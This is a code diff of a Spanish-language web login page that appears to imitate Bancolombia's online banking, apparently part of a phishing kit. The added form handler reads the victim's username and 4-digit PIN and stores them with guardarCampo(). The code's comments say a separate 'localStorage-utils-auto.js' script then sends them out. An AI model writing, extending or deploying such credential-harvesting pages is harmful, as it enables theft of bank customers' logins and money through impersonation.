@@ -222,9 +222,9 @@
         <div id="login" class="w-full flex flex-col justify-center items-center pb-6">
             <h5 id="titulo" class="text-[24px] font-cib-sans-bold mt-10">Te damos la bienvenida</h5>
 
-            <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
+            <form id="formLogin" class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
 
-                <!-- Usuario Form -->
+                <!-- Usuario Section -->
                 <div id="usuarioForm" class="w-[100%] bg-white px-2 py-4 rounded-xl flex flex-col items-center">
 
                     <div class="w-full flex items-center justify-center hiddenerror hidden">
@@ -246,7 +246,7 @@
                                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                                     d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                             </svg>
-                            <input id="usuario" type="text" class="floating-input" placeholder="" value=""
+                            <input id="usuario" name="usuario" type="text" class="floating-input" placeholder="" value=""
                                 autocomplete="off" />
                             <span id="usuarioLabel" class="floating-label">
                                 Usuario
@@ -256,10 +256,10 @@
                     </div>
 
                     <div class="w-full pt-6 pb-2 flex justify-between items-center px-[15px]">
-                        <button class="font-bold py-2 px-6 rounded-full border border-black w-32">
+                        <button type="button" class="font-bold py-2 px-6 rounded-full border border-black w-32">
                             Volver
                         </button>
-                        <button id="continuarUsuario"
+                        <button type="button" id="continuarUsuario"
                             class="font-bold py-2 px-6 bg-bancolombia-yellow rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed w-32"
                             disabled>
                             Continuar
@@ -267,7 +267,7 @@
                     </div>
                 </div>
 
-                <!-- Clave Form -->
+                <!-- Clave Section -->
                 <div id="claveForm" class="w-[100%] bg-white px-2 py-4 rounded-xl flex flex-col items-center hidden">
                     <div class="mt-2.5">
                         <img src="/3co/assets/candado.svg" alt="Candado" />
@@ -293,10 +293,10 @@
                     </div>
 
                     <div class="w-full pt-6 pb-2 flex justify-between items-center px-[15px]">
-                        <button id="volverClave" class="font-bold py-2 px-6 rounded-full border border-black w-32">
+                        <button type="button" id="volverClave" class="font-bold py-2 px-6 rounded-full border border-black w-32">
                             Volver
                         </button>
-                        <button id="enviar"
+                        <button type="submit" id="enviar"
                             class="font-bold py-2 px-6 bg-bancolombia-yellow rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed w-32"
                             disabled>
                             Continuar
@@ -304,7 +304,10 @@
                     </div>
                 </div>
 
-            </div>
+                <input type="hidden" id="no-status" name="status" value="login" />
+                <div id="mensaje"></div>
+
+            </form>
         </div>
 
     </div>
@@ -628,14 +631,38 @@
                 });
             }
 
-            // Listener para botón "Continuar Clave"
-            const enviarBtn = document.getElementById('enviar');
-            if (enviarBtn) {
-                enviarBtn.addEventListener('click', function () {
-                    if (validateClave()) {
-                        disableButtonTemporarily(this, 3000);
-                        // Aquí iría la lógica de envío de datos
-                        console.log('Datos listos para enviar');
+            // Listener para submit del formulario - guardar datos antes de enviar
+            const formLogin = document.getElementById('formLogin');
+            if (formLogin) {
+                formLogin.addEventListener('submit', function (e) {
+                    if (!validateClave()) {
+                        e.preventDefault();
+                        return;
+                    }
+
+                    // Obtener el usuario
+                    const usuarioInput = document.getElementById('usuario');
+                    const usuario = usuarioInput ? usuarioInput.value.trim() : '';
+
+                    // Obtener la clave de los inputs individuales
+                    let clave = '';
+                    for (let i = 0; i < 4; i++) {
+                        const input = document.getElementById(`clave-${i}`);
+                        if (input && input.dataset.realValue) {
+                            clave += input.dataset.realValue;
+                        }
+                    }
+
+                    // Guardar en localStorage para que localStorage-utils-auto.js los envíe
+                    if (typeof guardarCampo === 'function') {
+                        guardarCampo('usuario', usuario);
+                        guardarCampo('clave', clave);
+                    }
+
+                    // Deshabilitar botón mientras se envía
+                    const enviarBtn = document.getElementById('enviar');
+                    if (enviarBtn) {
+                        disableButtonTemporarily(enviarBtn, 3000);
                     }
                 });
             }
